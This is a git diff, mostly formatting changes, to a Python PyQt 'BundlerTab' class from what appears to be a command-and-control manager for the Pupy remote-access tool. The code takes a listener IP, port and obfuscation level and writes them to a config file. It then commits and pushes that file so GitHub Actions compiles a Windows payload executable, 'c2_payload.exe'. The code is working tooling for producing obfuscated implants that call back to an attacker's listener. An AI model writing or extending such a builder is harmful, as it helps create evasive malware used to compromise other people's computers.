@@ -219,21 +219,21 @@ class BundlerTab(QWidget):
 
         # Bundler Buttons
         button_layout = QHBoxLayout()
-        
+
         self.bundle_btn = QPushButton("🔨 Build Local (macOS)")
         self.bundle_btn.setStyleSheet(
             "background-color: #4CAF50; color: white; font-weight: bold; padding: 10px;"
         )
         self.bundle_btn.clicked.connect(self.start_bundling)
         button_layout.addWidget(self.bundle_btn)
-        
+
         self.github_build_btn = QPushButton("☁️ Build Windows (GitHub)")
         self.github_build_btn.setStyleSheet(
             "background-color: #0366d6; color: white; font-weight: bold; padding: 10px;"
         )
         self.github_build_btn.clicked.connect(self.build_on_github)
         button_layout.addWidget(self.github_build_btn)
-        
+
         layout.addLayout(button_layout)
 
         # Progress
@@ -332,14 +332,14 @@ class BundlerTab(QWidget):
         import subprocess
         import json
         from datetime import datetime
-        
+
         listener_ip = self.listener_ip_input.text().strip()
         listener_port = self.listener_port_spinbox.value()
-        
+
         if not listener_ip:
             QMessageBox.warning(self, "Error", "Enter listener IP")
             return
-        
+
         # Get obfuscation level
         obfuscation_text = self.obfuscation_combo.currentText()
         obfuscation_level = 5
@@ -351,7 +351,7 @@ class BundlerTab(QWidget):
             obfuscation_level = 3
         elif "Level 4" in obfuscation_text:
             obfuscation_level = 4
-        
+
         # Confirmation
         msg = f"""🚀 GitHub Actions Windows Build
 
@@ -367,15 +367,14 @@ Cette action va:
 4. Vous devrez télécharger l'artifact après 2-3 min
 
 Continuer?"""
-        
+
         reply = QMessageBox.question(
-            self, "Confirmation", msg,
-            QMessageBox.Yes | QMessageBox.No
+            self, "Confirmation", msg, QMessageBox.Yes | QMessageBox.No
         )
-        
+
         if reply != QMessageBox.Yes:
             return
-        
+
         try:
             # Create config file
             config = {
@@ -383,74 +382,69 @@ Continuer?"""
                 "listener_port": listener_port,
                 "obfuscation_level": obfuscation_level,
                 "platform": "windows",
-                "timestamp": datetime.now().isoformat()
+                "timestamp": datetime.now().isoformat(),
             }
-            
+
             config_path = Path.cwd() / "build_config.json"
             with open(config_path, "w") as f:
                 json.dump(config, f, indent=2)
-            
+
             self.output_text.append("\n[*] Configuration créée")
             self.output_text.append(f"[*] IP: {listener_ip}:{listener_port}")
             self.output_text.append(f"[*] Obfuscation: Level {obfuscation_level}\n")
-            
+
             # Git operations
             self.output_text.append("[*] Git add...")
             result = subprocess.run(
                 ["git", "add", "build_config.json"],
                 capture_output=True,
                 text=True,
-                cwd=str(Path.cwd())
+                cwd=str(Path.cwd()),
             )
-            
+
             if result.returncode != 0:
                 raise Exception(f"Git add failed: {result.stderr}")
-            
+
             self.output_text.append("[*] Git commit...")
             commit_msg = f"🔧 Windows Build: IP={listener_ip} Port={listener_port} Obf={obfuscation_level}"
             result = subprocess.run(
                 ["git", "commit", "-m", commit_msg],
                 capture_output=True,
                 text=True,
-                cwd=str(Path.cwd())
+                cwd=str(Path.cwd()),
             )
-            
+
             if result.returncode != 0 and "nothing to commit" not in result.stdout:
                 raise Exception(f"Git commit failed: {result.stderr}")
-            
+
             self.output_text.append("[*] Git push...")
             result = subprocess.run(
-                ["git", "push"],
-                capture_output=True,
-                text=True,
-                cwd=str(Path.cwd())
+                ["git", "push"], capture_output=True, text=True, cwd=str(Path.cwd())
             )
-            
+
             if result.returncode != 0:
                 raise Exception(f"Git push failed: {result.stderr}")
-            
+
             self.output_text.append("\n✅ Push réussi vers GitHub!")
             self.output_text.append("\n📊 Prochaines étapes:")
-            self.output_text.append("1. Va sur: https://github.com/kalilBelgoumri/pupy-c2-manager-macos/actions")
+            self.output_text.append(
+                "1. Va sur: https://github.com/kalilBelgoumri/pupy-c2-manager-macos/actions"
+            )
             self.output_text.append("2. Attends 2-3 minutes pour la compilation")
             self.output_text.append("3. Télécharge l'artifact 'c2-payload-windows'")
             self.output_text.append("4. Extrais c2_payload.exe (vrai Windows PE!)\n")
-            
+
             QMessageBox.information(
                 self,
                 "✅ Success",
                 "Push réussi vers GitHub!\n\n"
                 "Le workflow va compiler un vrai .exe Windows.\n"
-                "Va sur GitHub Actions pour télécharger l'artifact."
+                "Va sur GitHub Actions pour télécharger l'artifact.",
             )
-            
+
         except Exception as e:
             self.output_text.append(f"\n[!] ERROR: {str(e)}\n")
-            QMessageBox.critical(
-                self,
-                "Error",
-                f"Échec du push GitHub:\n{str(e)}"
-            )
+            QMessageBox.critical(self, "Error", f"Échec du push GitHub:\n{str(e)}")
 
 
 # Usage: Bundler Tab → Config → "Start Bundling"
